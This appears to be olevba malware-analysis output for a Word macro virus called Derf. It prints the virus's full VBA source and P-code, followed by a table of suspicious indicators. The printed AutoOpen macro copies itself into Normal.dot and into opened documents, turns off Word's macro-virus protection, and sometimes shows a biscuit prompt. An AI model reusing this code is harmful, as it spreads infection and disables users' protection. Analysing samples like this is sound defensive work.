olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Derf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Derf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Derf - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim DocFileName

'Please don't delete me.

Sub AutoOpen()

    DocFileName = Windows(1).Document.FullName
    
    Open "C:\DERF" For Random As #1
    Get #1, , Text
    Close #1
    
    If Text <> "Derf" Then
    
        Application.OrganizerCopy Source:=DocFileName, Destination:= _
        "C:\Program Files\Microsoft Office\Templates\Normal.dot", Name:="Module1" _
        , Object:=wdOrganizerObjectProjectItems
        Selection.TypeParagraph
    
        Text = "Derf"
        Open "C:\DERF" For Random As #1
        Put #1, , Text
        Close #1
    
    End If
    
    
    On Error GoTo Finish:
    
Other:
    
    Application.OrganizerCopy Source:= _
        "C:\Program Files\Microsoft Office\Templates\Normal.dot", Destination:= _
        DocFileName, Name:="Module1", Object:= _
    wdOrganizerObjectProjectItems
    
Finish:

With Options
    .VirusProtection = False
End With

Randomize (Timer)
If Int(Rnd() * 10) = 5 And WeekDay(Date) = 1 Then
    Fred
End If

End Sub

Sub Fred()

    Ans = InputBox("Hello. My name is Derf. Give me a biscuit.", "Derf")

    If Ans = "biscuit" Or Ans = "a biscuit" Then
        AnsYN = MsgBox("Mmm. Thankyou. Would you like to delete me now?.", vbYesNo, "Derf")
        If AnsYN = Yes Then
            Selection.TypeText Text:="1234567890Derf: Derf is now dead."
            Application.OrganizerDelete Source:= _
            "C:\Program Files\Microsoft Office\Templates\Normal.dot", Name:="Module1" _
            , Object:=wdOrganizerObjectProjectItems
            Application.OrganizerDelete Source:= _
            DocFileName, Name:="Module1" _
            , Object:=wdOrganizerObjectProjectItems
        End If
        If AnsYN = No Then
            GoTo Finish2:
        End If
    Else
        a = MsgBox("OK Then, Bye. I'll be back.", vbOKOnly, "Derf")
    End If
    
    Selection.TypeText Text:="1234567890Derf"

Finish2:

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Derf
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Module1 - 5553 bytes
' Line #0:
' 	Dim 
' 	VarDefn DocFileName
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x0017 "Please don't delete me."
' Line #3:
' Line #4:
' 	FuncDefn (Sub AutoOpen())
' Line #5:
' Line #6:
' 	LitDI2 0x0001 
' 	ArgsLd Windows 0x0001 
' 	MemLd Document 
' 	MemLd FullName 
' 	St DocFileName 
' Line #7:
' Line #8:
' 	LitStr 0x0007 "C:\DERF"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Random)
' Line #9:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Ld Then 
' 	GetRec 
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #11:
' Line #12:
' 	Ld Then 
' 	LitStr 0x0004 "Derf"
' 	Ne 
' 	IfBlock 
' Line #13:
' Line #14:
' 	LineCont 0x0008 09 00 08 00 0E 00 08 00
' 	Ld DocFileName 
' 	ParamNamed Source 
' 	LitStr 0x0036 "C:\Program Files\Microsoft Office\Templates\Normal.dot"
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Module1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #15:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #16:
' Line #17:
' 	LitStr 0x0004 "Derf"
' 	St Then 
' Line #18:
' 	LitStr 0x0007 "C:\DERF"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Random)
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Ld Then 
' 	PutRec 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #21:
' Line #22:
' 	EndIfBlock 
' Line #23:
' Line #24:
' Line #25:
' 	OnError Finish 
' 	BoS 0x0000 
' Line #26:
' Line #27:
' 	Label Other 
' Line #28:
' Line #29:
' 	LineCont 0x000C 05 00 08 00 09 00 08 00 11 00 04 00
' 	LitStr 0x0036 "C:\Program Files\Microsoft Office\Templates\Normal.dot"
' 	ParamNamed Source 
' 	Ld DocFileName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Module1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #30:
' Line #31:
' 	Label Finish 
' Line #32:
' Line #33:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #34:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #35:
' 	EndWith 
' Line #36:
' Line #37:
' 	Ld Timer 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #38:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0005 
' 	Eq 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #39:
' 	ArgsCall Fred 0x0000 
' Line #40:
' 	EndIfBlock 
' Line #41:
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' 	FuncDefn (Sub Fred())
' Line #45:
' Line #46:
' 	LitStr 0x002A "Hello. My name is Derf. Give me a biscuit."
' 	LitStr 0x0004 "Derf"
' 	ArgsLd InputBox 0x0002 
' 	St Ans 
' Line #47:
' Line #48:
' 	Ld Ans 
' 	LitStr 0x0007 "biscuit"
' 	Eq 
' 	Ld Ans 
' 	LitStr 0x0009 "a biscuit"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #49:
' 	LitStr 0x0030 "Mmm. Thankyou. Would you like to delete me now?."
' 	Ld vbYesNo 
' 	LitStr 0x0004 "Derf"
' 	ArgsLd MsgBox 0x0003 
' 	St AnsYN 
' Line #50:
' 	Ld AnsYN 
' 	Ld Yes 
' 	Eq 
' 	IfBlock 
' Line #51:
' 	LitStr 0x0021 "1234567890Derf: Derf is now dead."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #52:
' 	LineCont 0x0008 05 00 0C 00 0A 00 0C 00
' 	LitStr 0x0036 "C:\Program Files\Microsoft Office\Templates\Normal.dot"
' 	ParamNamed Source 
' 	LitStr 0x0007 "Module1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #53:
' 	LineCont 0x0008 05 00 0C 00 0A 00 0C 00
' 	Ld DocFileName 
' 	ParamNamed Source 
' 	LitStr 0x0007 "Module1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Ld AnsYN 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #56:
' 	GoTo Finish2 
' 	BoS 0x0000 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	ElseBlock 
' Line #59:
' 	LitStr 0x001B "OK Then, Bye. I'll be back."
' 	Ld vbOKOnly 
' 	LitStr 0x0004 "Derf"
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #60:
' 	EndIfBlock 
' Line #61:
' Line #62:
' 	LitStr 0x000E "1234567890Derf"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #63:
' Line #64:
' 	Label Finish2 
' Line #65:
' Line #66:
' 	EndSub 
' Line #67:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

